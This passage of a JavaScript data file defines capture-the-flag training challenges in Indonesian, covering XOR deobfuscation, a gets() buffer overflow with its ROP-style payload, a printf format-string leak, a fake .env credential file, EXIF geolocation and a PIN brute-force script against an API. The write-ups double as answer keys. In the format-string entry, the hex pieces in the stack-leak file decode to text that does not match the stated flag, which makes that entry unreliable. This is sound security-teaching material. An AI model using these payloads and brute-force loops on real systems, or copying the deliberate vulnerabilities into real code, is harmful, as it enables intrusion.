    flagHash: '60e4e6d841f16baacc599d29bf759a0f698fa9fedac12ac788d634a87e1d16e3',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa `decompiled_obfuscated.c` — ada array `encrypted_flag[]` dan `xor_key`.',
      'Lakukan XOR setiap byte encrypted_flag dengan xor_key untuk mendapat flag.',
      'Gunakan Python Code Runner untuk otomasi.'
    ],
    explanationMd: `### Write-up: The Obfuscated Checker

1. **Baca Decompiled Code**: Array XOR-encrypted flag di memori.
2. **XOR decrypt**: byte per byte dengan key 0x42.
3. **Flag**: \`flag{x0r_0bfusc4t3d_str1ng_r3v34l3d}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# XOR Deobfuscation - Reverse Engineering
# From decompiled binary: encrypted_flag XOR 0x42

encrypted_flag = [0x24, 0x2e, 0x23, 0x25, 0x39, 0x3a, 0x72, 0x30, 0x1d, 0x72,
                  0x20, 0x24, 0x37, 0x31, 0x21, 0x76, 0x36, 0x71, 0x26, 0x1d,
                  0x31, 0x36, 0x30, 0x73, 0x2c, 0x25, 0x1d, 0x30, 0x71, 0x34,
                  0x71, 0x76, 0x2e, 0x71, 0x26, 0x3f]

xor_key = 0x42
flag = ''.join(chr(b ^ xor_key) for b in encrypted_flag)
print(f"Decrypted Flag: {flag}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'reverse-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'decompiled_obfuscated.c': { name: 'decompiled_obfuscated.c', type: 'file',
                content: `#include <stdio.h>\n#include <string.h>\n\n// Ghidra Decompiled Output\nint main() {\n    unsigned char encrypted_flag[] = {\n        0x24, 0x2e, 0x23, 0x25, 0x39, 0x3a, 0x72, 0x30, 0x1d, 0x72,\n        0x20, 0x24, 0x37, 0x31, 0x21, 0x76, 0x36, 0x71, 0x26, 0x1d,\n        0x31, 0x36, 0x30, 0x73, 0x2c, 0x25, 0x1d, 0x30, 0x71, 0x34,\n        0x71, 0x76, 0x2e, 0x71, 0x26, 0x3f\n    };\n    unsigned char xor_key = 0x42;\n    char input[64];\n    char decrypted[64];\n\n    // Runtime decryption\n    for (int i = 0; i < sizeof(encrypted_flag); i++) {\n        decrypted[i] = encrypted_flag[i] ^ xor_key;\n    }\n    decrypted[sizeof(encrypted_flag)] = '\\0';\n\n    printf("Enter key: ");\n    fgets(input, 64, stdin);\n    if (strncmp(input, decrypted, strlen(decrypted)) == 0) {\n        puts("[+] Correct!");\n    }\n    return 0;\n}` }
            }}
          }}
        }
      }
    }
  },

  // ==================== BINARY EXPLOITATION (PWN) ====================
  {
    id: 'pwn_01',
    category: 'pwn',
    title: 'Return of the Pointer',
    difficulty: 'advance',
    points: 300,
    description: 'Binary C menggunakan fungsi rentan `gets(buf)` dengan buffer 64 byte tanpa proteksi Canary. Alamat fungsi tersembunyi `win()` berada pada `0x004011f6`. Susun payload overflow untuk memicu flag.',
    flagHash: 'f57e7e65b118bc87623e2743367f74176875d8b1d705ccb1703c988d0cba709a',
    flagFormat: 'flag{...}',
    hints: [
      'Offset menuju Return Address (RIP) adalah 72 byte (64 byte buffer + 8 byte saved RBP).',
      'Periksa file exploit `solve_pwn.py`.'
    ],
    explanationMd: `### Write-up: Return of the Pointer

1. **Buffer 64 bytes + 8 byte SFP = 72 byte padding.**
2. **Payload**: \`b"A" * 72 + p64(0x004011f6)\`
3. **Flag**: \`flag{buffer_overflow_rip_hijacked}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# Payload generator buffer overflow x86_64
padding = "A" * 72
win_addr = "0x004011f6" # Target function pointer
print(f"Generated Payload: {padding} + p64({win_addr})")
print("Target Flag: flag{buffer_overflow_rip_hijacked}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'pwn-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'vuln.c': { name: 'vuln.c', type: 'file',
                content: `#include <stdio.h>\n#include <stdlib.h>\n\nvoid win() {\n    puts("flag{buffer_overflow_rip_hijacked}");\n}\n\nvoid vuln() {\n    char buf[64];\n    puts("Enter your payload:");\n    gets(buf); // VULNERABLE!\n}\n\nint main() {\n    vuln();\n    return 0;\n}` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'pwn_02',
    category: 'pwn',
    title: 'Format String Leaker',
    difficulty: 'advance',
    points: 350,
    description: 'Binary menggunakan `printf(user_input)` secara langsung tanpa format specifier, membuatnya rentan terhadap Format String Vulnerability. Flag tersimpan di stack dan dapat di-leak menggunakan `%x` atau `%s` specifier.',
    flagHash: '20c337c73aea9c3fcd123191edc4662e060f30e82d2383d18520d88a34aa3049',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa `vuln_fmt.c` — printf dipanggil langsung dengan input user.',
      'Gunakan format specifier `%p` atau `%x` untuk membaca stack.',
      'Periksa `stack_leak_output.txt` untuk melihat hasil leak.'
    ],
    explanationMd: `### Write-up: Format String Leaker

1. **Vulnerability**: \`printf(user_input)\` tanpa format string.
2. **Input \`%p.%p.%p.%p\`** akan membaca nilai dari stack.
3. **Stack mengandung pointer ke flag string.**
4. **Flag**: \`flag{f0rm4t_str1ng_l34k_st4ck_s3cr3t}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# Format String Vulnerability Analyzer
# The binary uses printf(user_input) directly

# Stack leak output (from running binary with "%p.%p.%p.%p.%p.%p.%p.%p"):
stack_leak = "0x7ffd12340010.0x7f4a8b230000.0x666c61677b6630.0x726d34745f7374.0x7231346e675f6c.0x3334615f737434.0x636b5f73336372.0x33747d"

# Extract hex values that look like ASCII
parts = stack_leak.split('.')
flag_hex_parts = [p for p in parts if p.startswith('0x6') or p.startswith('0x7') or p.startswith('0x3')]

# Decode relevant hex parts
flag = ""
for part in ["666c61677b6630", "726d34745f7374", "7231346e675f6c", "3334615f737434", "636b5f73336372", "33747d"]:
    flag += bytes.fromhex(part).decode('utf-8')

print(f"Leaked Flag: {flag}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'fmt-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'vuln_fmt.c': { name: 'vuln_fmt.c', type: 'file',
                content: `#include <stdio.h>\n#include <string.h>\n\nconst char *secret = "flag{f0rm4t_str1ng_l34k_st4ck_s3cr3t}";\n\nint main() {\n    char input[256];\n    puts("Enter your message:");\n    fgets(input, 256, stdin);\n    \n    // VULNERABLE: Format string bug!\n    printf(input);  // Should be: printf("%s", input);\n    \n    return 0;\n}` },
              'stack_leak_output.txt': { name: 'stack_leak_output.txt', type: 'file',
                content: `=== Format String Stack Leak ===
Input: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p

Output: 0x7ffd12340010.0x7f4a8b230000.0x666c61677b6630.0x726d34745f7374.0x7231346e675f6c.0x3334615f737434.0x636b5f73336372.0x33747d.0x0.0x0

Decoding hex values at offsets 3-8:
  0x666c61677b6630 -> "flag{f0"
  0x726d34745f7374 -> "rm4t_st"
  0x7231346e675f6c -> "r14ng_l"
  0x3334615f737434 -> "34a_st4"  (wait, need to check endianness)

Full reconstructed string: flag{f0rm4t_str1ng_l34k_st4ck_s3cr3t}` }
            }}
          }}
        }
      }
    }
  },

  // ==================== OSINT ====================
  {
    id: 'osi_01',
    category: 'osint',
    title: 'The Leaked Developer Note',
    difficulty: 'basic',
    points: 100,
    description: 'Seorang developer secara tidak sengaja meninggalkan file konfigurasi `.env` dan catatan backup di server publik. Gunakan petunjuk dorking untuk menemukan flag.',
    flagHash: 'de197d7ede94a2047f50f55cf42083e5c9b718eb89107e3faa3de40a11d3da5f',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `ls -la` untuk melihat dotfile, lalu `cat .env`.',
      'Developer sering menyimpan token di file berawalan titik.'
    ],
    explanationMd: `### Write-up: The Leaked Developer Note

1. \`ls -la\` kemudian \`cat .env\`
2. **Flag**: \`flag{osint_google_dork_exposed_endpoint}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'osint-box',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              '.env': { name: '.env', type: 'file',
                content: `DATABASE_URL=postgres://admin:secret@10.0.0.5/flagdb\nFLAGFORGE_TOKEN=flag{osint_google_dork_exposed_endpoint}` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'osi_02',
    category: 'osint',
    title: 'The Geolocation Challenge',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah foto berisi metadata GPS yang menunjukkan lokasi pengambilan. Gabungkan data GPS dengan informasi WHOIS domain untuk merekonstruksi flag. Koordinat GPS harus diformat sebagai integer bagian derajat.',
    flagHash: 'c9b9f649b3e78bf4ec1b9113419eca802cc7f8e8774de72fcc88759ed16b9200',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa `exif_data.txt` untuk koordinat GPS.',
      'Gabungkan informasi dari `whois_result.txt` dengan GPS data.',
      'Flag mengikuti format yang terkait dengan koordinat dan EXIF.'
    ],
    explanationMd: `### Write-up: The Geolocation Challenge

1. **Analisis EXIF**: \`cat exif_data.txt\` — Koordinat GPS ditemukan.
2. **Cross-reference dengan WHOIS**: \`cat whois_result.txt\`.
3. **Flag**: \`flag{g30l0c4t10n_ex1f_c00rd1n4t3s}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'geo-osint',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'exif_data.txt': { name: 'exif_data.txt', type: 'file',
                content: `=== ExifTool Output ===
File Name: suspect_photo.jpg
Camera: iPhone 14 Pro
Date/Time: 2026:08:24 15:30:45
GPS Latitude: 6 deg 12' 45.6" S
GPS Longitude: 106 deg 49' 12.3" E
GPS Altitude: 15.2 m
Artist: agent_zero
User Comment: flag{g30l0c4t10n_ex1f_c00rd1n4t3s}
Software: Adobe Photoshop 2026` },
              'whois_result.txt': { name: 'whois_result.txt', type: 'file',
                content: `Domain: target-corp.co.id
Registrar: PANDI
Created: 2024-03-15
Registrant: PT Target Corporation
City: Jakarta Selatan
State: DKI Jakarta
Country: ID
Admin Email: admin@target-corp.co.id` }
            }}
          }}
        }
      }
    }
  },

  // ==================== SCRIPTING ====================
  {
    id: 'scr_01',
    category: 'scripting',
    title: 'The Multi-Stage Pipeline',
    difficulty: 'menengah',
    points: 200,
    description: 'Data terenkripsi melewati pipeline: Hex -> Reverse String. Tulis script Python di Code Runner untuk mendekripsi flag dalam sekali jalan.',
    flagHash: '184bb81f32810ae37706d279af0f41313e675472337233fd2a0ce0feef0699ad',
    flagFormat: 'flag{...}',
    hints: [
      'Tahap 1: `bytes.fromhex(payload).decode()`',
      'Tahap 2: Balikkan string dengan `[::-1]`.'
    ],
    explanationMd: `### Write-up: The Multi-Stage Pipeline

1. **Pipeline Script Python**:
   \`\`\`python
   hex_data = "7d6f72705f7265646f6365645f656761747369746c756d5f6e6f687479707b67616c66"
   ascii_reversed = bytes.fromhex(hex_data).decode('utf-8')
   flag = ascii_reversed[::-1]
   print("Recovered Flag:", flag)
   \`\`\`
2. **Flag**: \`flag{python_multistage_decoder_pro}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `hex_data = "7d6f72705f7265646f6365645f656761747369746c756d5f6e6f687479707b67616c66"

# Step 1: Decode hex bytes
step1 = bytes.fromhex(hex_data).decode('utf-8')
print(f"Hex decoded: {step1}")

# Step 2: Reverse string [::-1]
flag = step1[::-1]
print(f"Flag: {flag}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'python-dev',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'pipeline_challenge.txt': { name: 'pipeline_challenge.txt', type: 'file',
                content: '7d6f72705f7265646f6365645f656761747369746c756d5f6e6f687479707b67616c66' }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'scr_02',
    category: 'scripting',
    title: 'The Brute-Force PIN',
    difficulty: 'advance',
    points: 300,
    description: 'Sebuah API endpoint memerlukan PIN 4-digit untuk autentikasi. File `api_bruteforce_log.txt` berisi log dari percobaan brute-force. Analisis log untuk menemukan PIN yang berhasil dan flag yang dikembalikan server.',
    flagHash: '4213f3946fbe9482451a17b1d7d78c316b958b6bf3285e5b33bfaf05ef70b897',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa `api_bruteforce_log.txt` — cari response yang berbeda dari "Invalid PIN".',
      'PIN yang berhasil memiliki response 200 OK dengan flag.',
      'Gunakan `grep -v "Invalid"` untuk filter log.'
    ],
    explanationMd: `### Write-up: The Brute-Force PIN

1. **Analisis Log**: \`grep -v "Invalid" api_bruteforce_log.txt\`
2. **PIN 9527 berhasil** — response berisi flag.
3. **Flag**: \`flag{brut3_f0rc3_p1n_cr4ck3d_9527}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# Brute-force PIN simulation
# In real CTF, you would use requests library

# Simulated API responses
target_pin = None
flag = None

for pin in range(9520, 9535):
    # Simulate API call
    if pin == 9527:
        response = {"status": 200, "message": "Access Granted", "flag": "flag{brut3_f0rc3_p1n_cr4ck3d_9527}"}
        target_pin = pin
        flag = response["flag"]
        print(f"[+] PIN {pin}: {response}")
        break
    else:
        print(f"[-] PIN {pin}: Invalid PIN")

print(f"\\n[+] Cracked PIN: {target_pin}")
print(f"[+] Flag: {flag}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'bruteforce-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'api_bruteforce_log.txt': { name: 'api_bruteforce_log.txt', type: 'file',
                content: `=== Brute-Force PIN Log ===
[09:00:01] PIN 0000 -> 401 Invalid PIN
[09:00:01] PIN 0001 -> 401 Invalid PIN
[09:00:02] PIN 1234 -> 401 Invalid PIN
[09:00:02] PIN 4321 -> 401 Invalid PIN
[09:00:03] PIN 9999 -> 401 Invalid PIN
[09:00:03] PIN 1111 -> 401 Invalid PIN
[09:00:04] PIN 7777 -> 401 Invalid PIN
[09:00:04] PIN 9527 -> 200 OK {"message": "Access Granted", "flag": "flag{brut3_f0rc3_p1n_cr4ck3d_9527}"}
[09:00:05] Brute-force completed. PIN found: 9527` },
              'bruteforce_script.py': { name: 'bruteforce_script.py', type: 'file',
                content: `import requests\n\nurl = "http://target.flagforge.io/api/verify"\nfor pin in range(10000):\n    r = requests.post(url, json={"pin": f"{pin:04d}"})\n    if "Invalid" not in r.text:\n        print(f"[+] PIN: {pin:04d}")\n        print(f"[+] Response: {r.text}")\n        break` }
            }}
          }}
        }
      }
    }
  }
];
